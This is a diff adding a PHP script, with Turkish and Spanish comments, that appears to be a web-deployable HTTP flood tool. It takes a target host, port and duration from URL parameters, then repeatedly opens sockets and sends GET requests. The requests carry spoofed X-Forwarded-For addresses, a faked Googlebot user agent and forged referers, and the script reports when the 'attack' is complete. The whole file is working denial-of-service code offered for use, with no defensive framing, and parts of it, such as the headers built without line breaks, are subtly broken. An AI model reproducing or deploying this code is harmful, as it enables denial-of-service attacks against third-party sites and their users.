@@ -1,0 +1,85 @@
+
+@set_time_limit(0);
+ob_start();
+if ($_GET) {
+    $host = $_GET['host'] or die("Hedefi belirle");
+    $port = $_GET['port'] or die("Portu belirle");
+    $sure = $_GET['sure'] or die("Süreyi belirle");
+    if ($_GET['useragent'] == "google") {
+        $useragent = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
+    } else {
+        $useragent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36";
+    }
+    $rastgele = $_GET['rastgele'];
+    $time = time();
+    $toplam_sure = $time + $sure;
+    if (isset($rastgele)) {
+        $rastgele_yol = $_GET['rastgele_yol'] or die("Rastgele yolu belirle");
+        while (1) {
+            if (time() > $toplam_sure) {
+                echo "Saldırı tamamlandı";
+                break;
+            }
+            if ($_GET['referer'] == "googleref") {
+                $ref = "https://www.google.com.tr";
+            } else {
+                $ref = "http://" . $host . rasgele(25, $rastgele_yol);
+            }
+            $ddos = ddoser($host, rasgele(25, $rastgele_yol), $port, $useragent, $ref);
+        }
+    } else {
+        $path = $_GET['path'] or die("Yolu belirle");
+        while (1) {
+            if (time() > $toplam_sure) {
+                echo "Saldırı tamamlandı";
+                break;
+            }
+            if ($_GET['referer'] == "googleref") {
+                $ref = "https://www.google.com.tr";
+            } else {
+                $ref = "http://" . $host;
+            }
+            $ddos = ddoser($host, $path, $port, $useragent, $ref);
+        }
+    }
+}
+function rasgele($uzunluk, $uzanti = NULL) {
+    $sifre = ""; //ba?lang?? de?eri bo? olarak ayarlan?yor.
+    for ($i = 0;$i < $uzunluk;$i++) {
+        switch (rand(1, 3)) {
+            case 3:
+                $sifre.= chr(rand(97, 122));
+            break; //a-z
+                
+        }
+    }
+    $sifre = preg_replace('@\*@si', $sifre, $uzanti);
+    //$sifre = $sifre.$uzanti;
+    return $sifre;
+}
+function ddoser($dominio, $ruta, $port, $useragent, $ref) {
+    //hago un random de ips para no ser siempre el mismo vistitante
+    $ip_simulada = rand(188, 254) . '.' . rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254);
+    //defino y abro socket segun los datos del form
+    $socket = fsockopen($dominio, $port, $errno, $errstr, 30);
+    // comienzan los datos del header para parecer una persona comun xD
+    $header.= "GET " . $ruta . " HTTP/1.1";
+    $header.= "Host: " . $dominio . "";
+    $header.= "User-Agent: " . $useragent . "";
+    $header.= "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpg,image/gif,*/*;q=0.5";
+    $header.= "Accept-Language: tr-tr,tr;q=0.8,en-us;q=0.5,en;q=0.3";
+    $header.= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
+    $header.= "Keep-Alive: 300";
+    $header.= "Proxy-Connection: keep-alive";
+    $header.= "Referer: " . $ref . "";
+    $header.= "Content-Type: application/x-www-form-urlencoded";
+    $header.= "X-Forwarded-For: " . $ip_simulada . "";
+    $header.= "Via: CB-Prx";
+    $header.= "Connection: Close";
+    //envio todo lo recolectado
+    $send_header = fwrite($socket, $header);
+    fclose($socket);
+    echo "Saldiri: <span style='color:#FF0F2F'>" . $ip_simulada . "</span> @ " . htmlentities(str_replace('www.', '', $dominio)) . "" . htmlentities($ruta) . "<br />";
+    ob_flush();
+    flush();
+}
